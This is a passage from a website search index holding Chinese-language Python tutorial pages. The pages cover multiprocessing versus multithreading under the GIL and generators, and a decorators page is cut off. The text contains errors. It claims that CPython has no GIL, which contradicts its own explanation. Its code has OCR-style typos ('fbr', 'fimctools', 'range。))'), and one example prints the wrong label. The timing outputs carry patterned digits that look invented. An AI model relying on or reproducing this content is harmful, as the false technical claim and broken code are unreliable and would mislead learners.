\u591a\u8fdb\u7a0b\u548c\u591a\u7ebf\u7a0b\u7684\u5bf9\u6bd4 I/O\u5bc6\u96c6\u578b\u4efb\u52a1-\u591a\u8fdb\u7a0b from multiprocessing import Process import os,time #I/O\u5bc6\u96c6\u578b\u4efb\u52a1 def work(): time.sleep(2) print(\"===>\",file=open(\"tmp.txt\",\"w\")) if __name__ == \"__main__\": l = [] print(\"\u672c\u673a\u4e3a\",os.cpu_count(),\"\u6838 CPU\") start = time.time() for i in range(400): p = Process(target=work) l.append(p) p.start() for p in l: p.join() stop = time.time() print(\"I/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 %s\" %(stop - start)) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u672c\u673a\u4e3a 4 \u6838 CPU I/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 21.323242342342 I/O\u5bc6\u96c6\u578b\u4efb\u52a1-\u591a\u7ebf\u7a0b from threading import Thread import os,time #\u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1 def work(): time.sleep(2) print(\"===>\",file=open(\"tmp.txt\",\"w\")) if __name__ == \"__main__\": l = [] print(\"\u672c\u673a\u4e3a\",os.cpu_count(),\"\u6838 CPU\") start = time.time() for i in range(400): p = Thread(target=work) l.append(p) p.start() for p in l: p.join() stop = time.time() print(\"I/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 %s\" %(stop - start)) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u672c\u673a\u4e3a 4 \u6838 CPU I/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u7ebf\u7a0b\u8017\u65f6 2.323242342342","title":"\u591a\u8fdb\u7a0b\u548c\u591a\u7ebf\u7a0b"},{"location":"programming_language/python/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%A4%9A%E7%BA%BF%E7%A8%8B/#_1","text":"\u7531\u4e8e\u5168\u5c40\u9501GIL\uff08Global interpreter lock\uff09\u9650\u5236\u4e86Python\u4e2d\u7684\u591a\u7ebf\u7a0b\uff0c\u540c\u4e00\u65f6\u523b\u53ea\u80fd\u6709\u4e00\u4e2a\u7ebf\u7a0b\u8fd0\u884c\uff0c\u65e0\u6cd5\u53d1\u6325\u591a\u6838CPU\u7684\u4f18\u52bf\u3002\u9996\u5148\u9700\u8981\u660e\u786eGIL\u5e76\u4e0d\u662fPython\u7684\u7279\u6027\uff0c\u5b83\u662f\u5728\u5b9e\u73b0Python\u89e3\u6790\u5668\uff08CPython\uff09\u65f6\u6240\u5f15\u5165\u7684\u4e00\u4e2a\u6982\u5ff5\u3002\u5c31\u597d\u6bd4C++\u662f\u4e00\u5957\u8bed\u8a00\uff08\u8bed\u6cd5\uff09\u6807\u51c6\uff0c\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u7f16\u8bd1\u5668\u6765\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u4ee3\u7801\uff0c\u6bd4\u8f83\u6709\u540d\u7684\u7f16\u8bd1\u5668\u5982GCC\u3001INTEL C++\u3001Visual C++\u7b49\u3002Python\u4e5f\u4e00\u6837\uff0c\u540c\u6837\u4e00\u6bb5\u4ee3\u7801\u53ef\u4ee5\u901a\u8fc7CPython\u3001PyPy\u3001Psyco\u7b49\u4e0d\u540c\u7684Python\u6267\u884c\u73af\u5883\u6765\u6267\u884c\uff0c\u50cf\u5176\u4e2d\u7684CPython \u5c31\u6ca1\u6709GIL\u3002\u7136\u800c\u56e0\u4e3aCPython\u662f\u5927\u90e8\u5206\u73af\u5883\u4e0b\u9ed8\u8ba4\u7684Python\u6267\u884c\u73af\u5883\uff0c\u6240\u4ee5\u5728\u5f88\u591a\u4eba\u7684\u6982\u5ff5\u91ccCPython\u5c31\u662fPython\uff0c\u4e5f\u5c31\u60f3\u5f53\u7136\u5730\u628aGIL\u5f52\u7ed3\u4e3aPython\u8bed\u8a00\u7684\u7f3a\u9677\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u9700\u8981\u5148\u660e\u786e\u4e00\u70b9\uff1aGIL\u5e76\u4e0d\u662fPython\u7684\u7279\u6027\uff0cPython\u5b8c\u5168\u53ef\u4ee5\u4e0d\u4f9d\u8d56\u4e8eGIL\u3002GIL\u672c\u8d28\u5c31\u662f\u4e00\u628a\u4e92\u65a5\u9501\uff0c\u65e2\u7136\u662f\u4e92\u65a5\u9501\uff0c\u90a3\u4e48\u6240\u6709\u4e92\u65a5\u9501\u7684\u672c\u8d28\u5c31\u90fd\u4e00\u6837\uff0c\u90fd\u662f\u5c06\u5e76\u53d1\u8fd0\u884c\u53d8\u6210\u4e32\u884c\uff0c\u4ee5\u6b64\u6765\u63a7\u5236\u540c\u4e00\u65f6\u95f4\u5185\u5171\u4eab\u6570\u636e\u53ea\u80fd\u88ab\u4e00\u4e2a\u4efb\u52a1\u4fee\u6539\uff0c\u8fdb\u800c\u4fdd\u8bc1\u6570\u636e\u7684\u5b89\u5168\u3002\u7531\u4e8eCPython\u7684\u5185\u5b58\u7ba1\u7406\u673a\u5236\uff0c\u56e0\u6b64\u9700\u8981\u786e\u4fdd\u5171\u4eab\u6570\u636e\u7684\u8bbf\u95ee\u5b89\u5168\uff0c\u5373\u52a0\u9501\u5904\u7406\uff08GIL\uff09\u3002\u6709\u4e86GIL\u7684\u5b58\u5728\uff0c\u540c\u4e00\u65f6\u523b\u540c\u4e00\u8fdb\u7a0b\u4e2d\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u88ab\u6267\u884c\uff0c\u90a3\u4e48\u6709\u8bfb\u8005\u53ef\u80fd\u8981\u95ee\u4e86\uff1a\u8fdb\u7a0b\u53ef\u4ee5\u5229\u7528\u591a\u6838\uff0c\u800cPython\u7684\u591a\u7ebf\u7a0b\u5374\u65e0\u6cd5\u5229\u7528\u591a\u6838\u4f18\u52bf\uff0cPython\u7684\u591a\u7ebf\u7a0b\u662f\u4e0d\u662f\u6ca1\u7528\u4e86\uff1f\u7b54\u6848\u5f53\u7136\u4e0d\u662f\u3002\u9996\u5148\u660e\u786e\u6211\u4eec\u7ebf\u7a0b\u6267\u884c\u7684\u4efb\u52a1\u662f\u4ec0\u4e48\uff0c\u662f\u505a\u8ba1\u7b97\uff08\u8ba1\u7b97\u5bc6\u96c6\u578b\uff09\u8fd8\u662f\u505a\u8f93\u5165\uff0f\u8f93\u51fa\uff08I/O\u5bc6\u96c6\u578b\uff09\uff0c\u4e0d\u540c\u7684\u573a\u666f\u4f7f\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\u3002\u591a\u6838CPU\uff0c\u610f\u5473\u7740\u53ef\u4ee5\u6709\u591a\u4e2a\u6838\u5e76\u884c\u5b8c\u6210\u8ba1\u7b97\uff0c\u591a\u6838\u63d0\u5347\u7684\u662f\u8ba1\u7b97\u6027\u80fd\uff0c\u4f46\u6bcf\u4e2aCPU\u4e00\u65e6\u9047\u5230I/O\u963b\u585e\uff0c\u4ecd\u9700\u8981\u7b49\u5f85\uff0c\u6240\u4ee5\u591a\u6838\u5bf9I/O\u5bc6\u96c6\u578b\u4efb\u52a1\u6ca1\u4ec0\u4e48\u592a\u9ad8\u63d0\u5347\u3002 \u5728Python\u4e2d\uff0c\u5bf9\u4e8e\u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u5360\u4f18\u52bf\uff1b\u5bf9\u4e8eI/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u7ebf\u7a0b\u5360\u4f18\u52bf\u3002\u5f53\u7136\uff0c\u5bf9\u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\u6765\u8bf4\uff0c\u968f\u7740CPU\u7684\u589e\u591a\u6267\u884c\u6548\u7387\u80af\u5b9a\u4f1a\u6709\u6240\u63d0\u9ad8\uff0c\u8fd9\u662f\u56e0\u4e3a\u4e00\u4e2a\u7a0b\u5e8f\u57fa\u672c\u4e0a\u4e0d\u4f1a\u662f\u7eaf\u8ba1\u7b97\u6216\u7eafI/O\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u76f8\u5bf9\u7684\u53bb\u770b\u4e00\u4e2a\u7a0b\u5e8f\u5230\u5e95\u662f\u8ba1\u7b97\u5bc6\u96c6\u578b\u8fd8\u662fI/O\u5bc6\u96c6\u578b\u3002","title":"\u591a\u8fdb\u7a0b\u548c\u591a\u7ebf\u7a0b"},{"location":"programming_language/python/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%A4%9A%E7%BA%BF%E7%A8%8B/#_2","text":"\u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1-\u591a\u8fdb\u7a0b from multiprocessing import Process import os,time #\u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1 def work(): res = 0 for i in range(100000000): res *= i if __name__ == \"__main__\": l = [] print(\"\u672c\u673a\u4e3a\",os.cpu_count(),\"\u6838 CPU\") start = time.time() for i in range(4): p = Process(target=work) l.append(p) p.start() for p in l: p.join() stop = time.time() print(\"\u8ba1\u7b97\u5bc6\u96c6\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 %s\" %(stop - start)) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u672c\u673a\u4e3a 4 \u6838 CPU \u8ba1\u7b97\u5bc6\u96c6\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 14.9013434234213 \u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1-\u591a\u7ebf\u7a0b from threading import Thread import os,time #\u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1 def work(): res = 0 for i in range(100000000): res *= i if __name__ == \"__main__\": l = [] print(\"\u672c\u673a\u4e3a\",os.cpu_count(),\"\u6838 CPU\") start = time.time() for i in range(4): p = Thread(target=work) l.append(p) p.start() for p in l: p.join() stop = time.time() print(\"\u8ba1\u7b97\u5bc6\u96c6\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 %s\" %(stop - start)) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u672c\u673a\u4e3a 4 \u6838 CPU \u8ba1\u7b97\u5bc6\u96c6\u4efb\u52a1\uff0c\u591a\u7ebf\u7a0b\u8017\u65f6 23.80342342342","title":"\u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1  \u591a\u8fdb\u7a0b\u548c\u591a\u7ebf\u7a0b\u7684\u5bf9\u6bd4"},{"location":"programming_language/python/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%A4%9A%E7%BA%BF%E7%A8%8B/#io","text":"I/O\u5bc6\u96c6\u578b\u4efb\u52a1-\u591a\u8fdb\u7a0b from multiprocessing import Process import os,time #I/O\u5bc6\u96c6\u578b\u4efb\u52a1 def work(): time.sleep(2) print(\"===>\",file=open(\"tmp.txt\",\"w\")) if __name__ == \"__main__\": l = [] print(\"\u672c\u673a\u4e3a\",os.cpu_count(),\"\u6838 CPU\") start = time.time() for i in range(400): p = Process(target=work) l.append(p) p.start() for p in l: p.join() stop = time.time() print(\"I/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 %s\" %(stop - start)) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u672c\u673a\u4e3a 4 \u6838 CPU I/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 21.323242342342 I/O\u5bc6\u96c6\u578b\u4efb\u52a1-\u591a\u7ebf\u7a0b from threading import Thread import os,time #\u8ba1\u7b97\u5bc6\u96c6\u578b\u4efb\u52a1 def work(): time.sleep(2) print(\"===>\",file=open(\"tmp.txt\",\"w\")) if __name__ == \"__main__\": l = [] print(\"\u672c\u673a\u4e3a\",os.cpu_count(),\"\u6838 CPU\") start = time.time() for i in range(400): p = Thread(target=work) l.append(p) p.start() for p in l: p.join() stop = time.time() print(\"I/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u8fdb\u7a0b\u8017\u65f6 %s\" %(stop - start)) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u672c\u673a\u4e3a 4 \u6838 CPU I/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff0c\u591a\u7ebf\u7a0b\u8017\u65f6 2.323242342342","title":"I/O\u5bc6\u96c6\u578b\u4efb\u52a1  \u591a\u8fdb\u7a0b\u548c\u591a\u7ebf\u7a0b\u7684\u5bf9\u6bd4"},{"location":"programming_language/python/%E7%94%9F%E6%88%90%E5%99%A8/","text":"Python\u7684\u751f\u6210\u5668(Generator) \u901a\u8fc7\u5217\u8868\u751f\u6210\u5f0f\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u4e00\u4e2a\u5217\u8868\uff0c\u4f46\u662f\uff0c\u5217\u8868\u751f\u6210\u5f0f\u53d7\u5230\u5185\u5b58\u9650\u5236\uff0c\u56e0\u4e3a\u5217\u8868\u5bb9\u91cf\u80af\u5b9a\u662f\u6709 \u9650\u7684\u3002\u5982\u679c\u521b\u5efa\u4e00\u4e2a\u5305\u542b100\u4e07\u4e2a\u5143\u7d20\u7684\u5217\u8868\uff0c\u90a3\u4e48\u8fd9\u5c06\u4f1a\u5360\u7528\u5f88\u5927\u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u82e5\u4ec5\u4ec5\u53ea\u8bbf\u95ee\u524d\u9762\u51e0\u4e2a\u5143\u7d20\uff0c\u5219\u540e\u9762\u7edd\u5927\u591a\u6570\u5143\u7d20\u5360\u7528\u7684\u7a7a\u95f4\u90fd\u6d6a\u8d39\u4e86\u3002\u6240\u4ee5\uff0c\u5982\u679c\u5217\u8868\u5143\u7d20\u53ef\u4ee5\u6309\u7167\u67d0\u79cd\u7b97\u6cd5\u63a8\u7b97\u51fa\u6765\uff0c \u90a3\u5c31\u53ef\u4ee5\u5728\u5faa\u73af\u7684\u8fc7\u7a0b\u4e2d\u4e0d\u65ad\u63a8\u7b97\u51fa\u540e\u7eed\u7684\u5143\u7d20\u3002\u8fd9\u6837\u5c31\u4e0d\u5fc5\u521b\u5efa\u5b8c\u6574\u7684list\uff0c\u4ece\u800c\u8282\u7701\u5927\u91cf\u7684\u7a7a\u95f4\u3002\u5728 Python\u4e2d\uff0c\u8fd9\u79cd\u4e00\u8fb9\u5faa\u73af\u4e00\u8fb9\u8ba1\u7b97\u7684\u673a\u5236\uff0c\u88ab\u79f0\u4e3a\u751f\u6210\u5668(Generator)\u3002\u751f\u6210\u5668\u662f\u5b9e\u73b0\u8fed\u4ee3\u5668\u7684\u4e00\u79cd\u673a\u5236\u3002\u5176\u529f\u80fd\u7684\u5b9e\u73b0\u4f9d\u8d56\u4e8eyield\u8868\u8fbe\u5f0f\uff0c\u9664\u6b64\u4e4b\u5916\u5b83\u8ddf\u666e\u901a\u7684\u51fd\u6570\u6ca1\u6709\u4e24\u6837\u3002 \u7b80\u5355\u751f\u6210\u5668 \u8981\u521b\u5efa\u4e00\u4e2aGenerator\uff0c\u6709\u5f88\u591a\u79cd\u65b9\u6cd5\u3002\u7b2c\u4e00\u79cd\u65b9\u6cd5\u5f88\u7b80\u5355\uff0c\u53ea\u8981\u628a\u4e00\u4e2a\u5217\u8868\u751f\u6210\u5f0f\u7684[ ]\u6539\u6210( )\uff0c\u5c31\u521b\u5efa\u4e86\u4e00\u4e2aGenerator\uff1a >>> L = [x * x fbr x in range(10)] >>> g = (x * x fbr x in range(10)) >>> >>> print(L) [0,1,4,9,16,25,36,49,64,81] >>> print(g) <generator object <genexpr> at 0x03B54600> \u5728 Python 3 \u4e2d\uff1a >>> g = (x * x for x in range\u3002)) >>> print(g.next()) Traceback (most recent call last): File '<stdin>', line 1, in <module> AttributeError: 'generator* object has no attribute 'next* >>> print(g.__next__()) 0 >>> print(g.__next__()) 1 >>> print(next(g)) #\u8fd9\u91cc*2*\u79cd\u5199\u6cd5\u90fd\u53ef\u4ee5 4 >>> print(g.__next__()) Traceback (most recent call last): File '<stdin>', line 1, in <module> Stopiteration >>> Generator\u4fdd\u5b58\u7684\u662f\u7b97\u6cd5\uff0c\u6bcf\u6b21\u8c03\u7528next()\uff0c\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u4e0b\u4e00\u4e2a\u5143\u7d20\u7684\u503c\uff0c\u76f4\u5230\u8ba1\u7b97\u5230\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u6ca1\u6709\u66f4\u591a\u7684\u5143\u7d20\u65f6\uff0c\u629b\u51faStopiteration\u7684\u9519\u8bef\u3002\u5f53\u7136\uff0c\u4e0a\u9762\u8fd9\u79cd\u4e0d\u65ad\u8c03\u7528next()\u3002\u65b9\u6cd5\u4e0d\u63a8\u8350\u4f7f\u7528\uff0c\u6b63\u786e\u7684\u65b9\u6cd5\u662f\u4f7f\u7528for\u5faa\u73af\uff0c\u56e0\u4e3aGenerator\u4e5f\u662f\u53ef\u8fed\u4ee3\u5bf9\u8c61 g=(x * x for x in range(3)) for n in g: print(n) \u5e26 yield \u8bed\u53e5\u7684\u751f\u6210\u5668 \u5982\u679c\u4e00\u4e2a\u51fd\u6570\u5b9a\u4e49\u4e2d\u5305\u542byield\u5173\u952e\u5b57\uff0c\u90a3\u4e48\u8fd9\u4e2a\u51fd\u6570\u5c31\u4e0d\u518d\u662f\u4e00\u4e2a\u666e\u901a\u51fd\u6570\uff0c\u800c\u662f\u4e00\u4e2aGenerator\u3002 \u4e0e\u666e\u901a\u51fd\u6570\u4e0d\u540c\u7684\u662f\uff0c\u751f\u6210\u5668\u662f\u4e00\u4e2a\u8fd4\u56de\u8fed\u4ee3\u5668\u7684\u51fd\u6570\uff0c\u53ea\u80fd\u7528\u4e8e\u8fed\u4ee3\u64cd\u4f5c\uff0c\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\uff1a\u751f\u6210\u5668 \u5c31\u662f\u4e00\u4e2a\u8fed\u4ee3\u5668\u3002\u5728\u8c03\u7528\u751f\u6210\u5668\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u6b21\u9047\u5230yield\u65f6\u51fd\u6570\u4f1a\u6682\u505c\u5e76\u4fdd\u5b58\u5f53\u524d\u6240\u6709\u7684\u8fd0\u884c\u4fe1\u606f, \u8fd4\u56deyield\u7684\u503c\uff0c\u5e76\u5728\u4e0b\u4e00\u6b21\u6267\u884cnext\u3002\u65b9\u6cd5\u65f6\u4ece\u5f53\u524d\u4f4d\u7f6e\u7ee7\u7eed\u8fd0\u884c\u3002\u8c03\u7528\u4e00\u4e2a\u751f\u6210\u5668\u51fd\u6570\uff0c\u8fd4\u56de\u7684\u662f\u4e00 \u4e2a\u8fed\u4ee3\u5668\u5bf9\u8c61\u3002 range\u529f\u80fd\uff1a range(start, stop[, step]) \u53c2\u6570\u8bf4\u660e\uff1a start: \u8ba1\u6570\u4ece start \u5f00\u59cb\u3002\u9ed8\u8ba4\u662f\u4ece 0 \u5f00\u59cb\u3002\u4f8b\u5982range\uff085\uff09\u7b49\u4ef7\u4e8erange\uff080\uff0c 5\uff09; stop: \u8ba1\u6570\u5230 stop \u7ed3\u675f\uff0c\u4f46\u4e0d\u5305\u62ec stop\u3002\u4f8b\u5982\uff1arange\uff080\uff0c 5\uff09 \u662f[0, 1, 2, 3, 4]\u6ca1\u67095 step\uff1a\u6b65\u957f\uff0c\u9ed8\u8ba4\u4e3a1\u3002\u4f8b\u5982\uff1arange\uff080\uff0c 5\uff09 \u7b49\u4ef7\u4e8e range(0, 5, 1) \u4f8b\u5982\uff1a for i in range(3,-1,-1): print(i) \u8fd0\u884c\u7ed3\u679c\uff1a 3 2 1 0 \u751f\u6210\u5668 def reverse(data): for index in range(len(data)-1, -1, -1): yield data[index] >>> >>> for char in reverse('golf'): ... print(char) ... f l o g","title":"python\u751f\u6210\u5668"},{"location":"programming_language/python/%E7%94%9F%E6%88%90%E5%99%A8/#pythongenerator","text":"\u901a\u8fc7\u5217\u8868\u751f\u6210\u5f0f\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u4e00\u4e2a\u5217\u8868\uff0c\u4f46\u662f\uff0c\u5217\u8868\u751f\u6210\u5f0f\u53d7\u5230\u5185\u5b58\u9650\u5236\uff0c\u56e0\u4e3a\u5217\u8868\u5bb9\u91cf\u80af\u5b9a\u662f\u6709 \u9650\u7684\u3002\u5982\u679c\u521b\u5efa\u4e00\u4e2a\u5305\u542b100\u4e07\u4e2a\u5143\u7d20\u7684\u5217\u8868\uff0c\u90a3\u4e48\u8fd9\u5c06\u4f1a\u5360\u7528\u5f88\u5927\u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u82e5\u4ec5\u4ec5\u53ea\u8bbf\u95ee\u524d\u9762\u51e0\u4e2a\u5143\u7d20\uff0c\u5219\u540e\u9762\u7edd\u5927\u591a\u6570\u5143\u7d20\u5360\u7528\u7684\u7a7a\u95f4\u90fd\u6d6a\u8d39\u4e86\u3002\u6240\u4ee5\uff0c\u5982\u679c\u5217\u8868\u5143\u7d20\u53ef\u4ee5\u6309\u7167\u67d0\u79cd\u7b97\u6cd5\u63a8\u7b97\u51fa\u6765\uff0c \u90a3\u5c31\u53ef\u4ee5\u5728\u5faa\u73af\u7684\u8fc7\u7a0b\u4e2d\u4e0d\u65ad\u63a8\u7b97\u51fa\u540e\u7eed\u7684\u5143\u7d20\u3002\u8fd9\u6837\u5c31\u4e0d\u5fc5\u521b\u5efa\u5b8c\u6574\u7684list\uff0c\u4ece\u800c\u8282\u7701\u5927\u91cf\u7684\u7a7a\u95f4\u3002\u5728 Python\u4e2d\uff0c\u8fd9\u79cd\u4e00\u8fb9\u5faa\u73af\u4e00\u8fb9\u8ba1\u7b97\u7684\u673a\u5236\uff0c\u88ab\u79f0\u4e3a\u751f\u6210\u5668(Generator)\u3002\u751f\u6210\u5668\u662f\u5b9e\u73b0\u8fed\u4ee3\u5668\u7684\u4e00\u79cd\u673a\u5236\u3002\u5176\u529f\u80fd\u7684\u5b9e\u73b0\u4f9d\u8d56\u4e8eyield\u8868\u8fbe\u5f0f\uff0c\u9664\u6b64\u4e4b\u5916\u5b83\u8ddf\u666e\u901a\u7684\u51fd\u6570\u6ca1\u6709\u4e24\u6837\u3002","title":"Python\u7684\u751f\u6210\u5668(Generator)"},{"location":"programming_language/python/%E7%94%9F%E6%88%90%E5%99%A8/#_1","text":"\u8981\u521b\u5efa\u4e00\u4e2aGenerator\uff0c\u6709\u5f88\u591a\u79cd\u65b9\u6cd5\u3002\u7b2c\u4e00\u79cd\u65b9\u6cd5\u5f88\u7b80\u5355\uff0c\u53ea\u8981\u628a\u4e00\u4e2a\u5217\u8868\u751f\u6210\u5f0f\u7684[ ]\u6539\u6210( )\uff0c\u5c31\u521b\u5efa\u4e86\u4e00\u4e2aGenerator\uff1a >>> L = [x * x fbr x in range(10)] >>> g = (x * x fbr x in range(10)) >>> >>> print(L) [0,1,4,9,16,25,36,49,64,81] >>> print(g) <generator object <genexpr> at 0x03B54600> \u5728 Python 3 \u4e2d\uff1a >>> g = (x * x for x in range\u3002)) >>> print(g.next()) Traceback (most recent call last): File '<stdin>', line 1, in <module> AttributeError: 'generator* object has no attribute 'next* >>> print(g.__next__()) 0 >>> print(g.__next__()) 1 >>> print(next(g)) #\u8fd9\u91cc*2*\u79cd\u5199\u6cd5\u90fd\u53ef\u4ee5 4 >>> print(g.__next__()) Traceback (most recent call last): File '<stdin>', line 1, in <module> Stopiteration >>> Generator\u4fdd\u5b58\u7684\u662f\u7b97\u6cd5\uff0c\u6bcf\u6b21\u8c03\u7528next()\uff0c\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u4e0b\u4e00\u4e2a\u5143\u7d20\u7684\u503c\uff0c\u76f4\u5230\u8ba1\u7b97\u5230\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u6ca1\u6709\u66f4\u591a\u7684\u5143\u7d20\u65f6\uff0c\u629b\u51faStopiteration\u7684\u9519\u8bef\u3002\u5f53\u7136\uff0c\u4e0a\u9762\u8fd9\u79cd\u4e0d\u65ad\u8c03\u7528next()\u3002\u65b9\u6cd5\u4e0d\u63a8\u8350\u4f7f\u7528\uff0c\u6b63\u786e\u7684\u65b9\u6cd5\u662f\u4f7f\u7528for\u5faa\u73af\uff0c\u56e0\u4e3aGenerator\u4e5f\u662f\u53ef\u8fed\u4ee3\u5bf9\u8c61 g=(x * x for x in range(3)) for n in g: print(n)","title":"\u7b80\u5355\u751f\u6210\u5668"},{"location":"programming_language/python/%E7%94%9F%E6%88%90%E5%99%A8/#yield","text":"\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u5b9a\u4e49\u4e2d\u5305\u542byield\u5173\u952e\u5b57\uff0c\u90a3\u4e48\u8fd9\u4e2a\u51fd\u6570\u5c31\u4e0d\u518d\u662f\u4e00\u4e2a\u666e\u901a\u51fd\u6570\uff0c\u800c\u662f\u4e00\u4e2aGenerator\u3002 \u4e0e\u666e\u901a\u51fd\u6570\u4e0d\u540c\u7684\u662f\uff0c\u751f\u6210\u5668\u662f\u4e00\u4e2a\u8fd4\u56de\u8fed\u4ee3\u5668\u7684\u51fd\u6570\uff0c\u53ea\u80fd\u7528\u4e8e\u8fed\u4ee3\u64cd\u4f5c\uff0c\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\uff1a\u751f\u6210\u5668 \u5c31\u662f\u4e00\u4e2a\u8fed\u4ee3\u5668\u3002\u5728\u8c03\u7528\u751f\u6210\u5668\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u6b21\u9047\u5230yield\u65f6\u51fd\u6570\u4f1a\u6682\u505c\u5e76\u4fdd\u5b58\u5f53\u524d\u6240\u6709\u7684\u8fd0\u884c\u4fe1\u606f, \u8fd4\u56deyield\u7684\u503c\uff0c\u5e76\u5728\u4e0b\u4e00\u6b21\u6267\u884cnext\u3002\u65b9\u6cd5\u65f6\u4ece\u5f53\u524d\u4f4d\u7f6e\u7ee7\u7eed\u8fd0\u884c\u3002\u8c03\u7528\u4e00\u4e2a\u751f\u6210\u5668\u51fd\u6570\uff0c\u8fd4\u56de\u7684\u662f\u4e00 \u4e2a\u8fed\u4ee3\u5668\u5bf9\u8c61\u3002 range\u529f\u80fd\uff1a range(start, stop[, step]) \u53c2\u6570\u8bf4\u660e\uff1a start: \u8ba1\u6570\u4ece start \u5f00\u59cb\u3002\u9ed8\u8ba4\u662f\u4ece 0 \u5f00\u59cb\u3002\u4f8b\u5982range\uff085\uff09\u7b49\u4ef7\u4e8erange\uff080\uff0c 5\uff09; stop: \u8ba1\u6570\u5230 stop \u7ed3\u675f\uff0c\u4f46\u4e0d\u5305\u62ec stop\u3002\u4f8b\u5982\uff1arange\uff080\uff0c 5\uff09 \u662f[0, 1, 2, 3, 4]\u6ca1\u67095 step\uff1a\u6b65\u957f\uff0c\u9ed8\u8ba4\u4e3a1\u3002\u4f8b\u5982\uff1arange\uff080\uff0c 5\uff09 \u7b49\u4ef7\u4e8e range(0, 5, 1) \u4f8b\u5982\uff1a for i in range(3,-1,-1): print(i) \u8fd0\u884c\u7ed3\u679c\uff1a 3 2 1 0 \u751f\u6210\u5668 def reverse(data): for index in range(len(data)-1, -1, -1): yield data[index] >>> >>> for char in reverse('golf'): ... print(char) ... f l o g","title":"\u5e26yield\u8bed\u53e5\u7684\u751f\u6210\u5668"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/","text":"\u88c5\u9970\u5668 \u88c5\u9970\u5668\u672c\u8d28\u4e0a\u662f\u4e00\u4e2aPython\u51fd\u6570\uff0c\u5b83\u53ef\u4ee5\u8ba9\u5176\u4ed6\u51fd\u6570\u5728\u4e0d\u9700\u8981\u505a\u4efb\u4f55\u4ee3\u7801\u53d8\u52a8\u7684\u524d\u63d0\u4e0b\u589e\u52a0\u989d\u5916\u529f\u80fd\uff0c\u63d0\u9ad8\u4e86\u4ee3\u7801\u7684\u590d\u7528\u6027\u3002\u88c5\u9970\u5668\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570\u3002\u88c5\u9970\u5668\u4e3b\u8981\u6709\u4ee5\u4e0b\u529f\u80fd\uff1a \u5f15\u5165\u65e5\u5fd7\u3002 \u51fd\u6570\u6267\u884c\u65f6\u95f4\u7edf\u8ba1\u3002 \u6267\u884c\u51fd\u6570\u524d\u9884\u5907\u5904\u7406\u3002 \u6267\u884c\u51fd\u6570\u540e\u7684\u6e05\u7406\u529f\u80fd\u3002 \u6743\u9650\u6821\u9a8c\u7b49\u573a\u666f\u3002 \u7f13\u5b58 \u88c5\u9970\u5668\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u4ee5\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u5e76\u8fd4\u56de\u4e00\u4e2a\u66ff\u6362\u51fd\u6570\u7684\u53ef\u6267\u884c\u51fd\u6570\u3002\u5728\u4e0d\u6539\u52a8\u539f\u51fd\u6570\u4ee3\u7801\u7684\u60c5 \u51b5\u4e0b\uff0c\u4e3a\u5176\u589e\u52a0\u65b0\u7684\u529f\u80fd\u3002 \u4f8b1\uff1a import time import fimctools def add(): 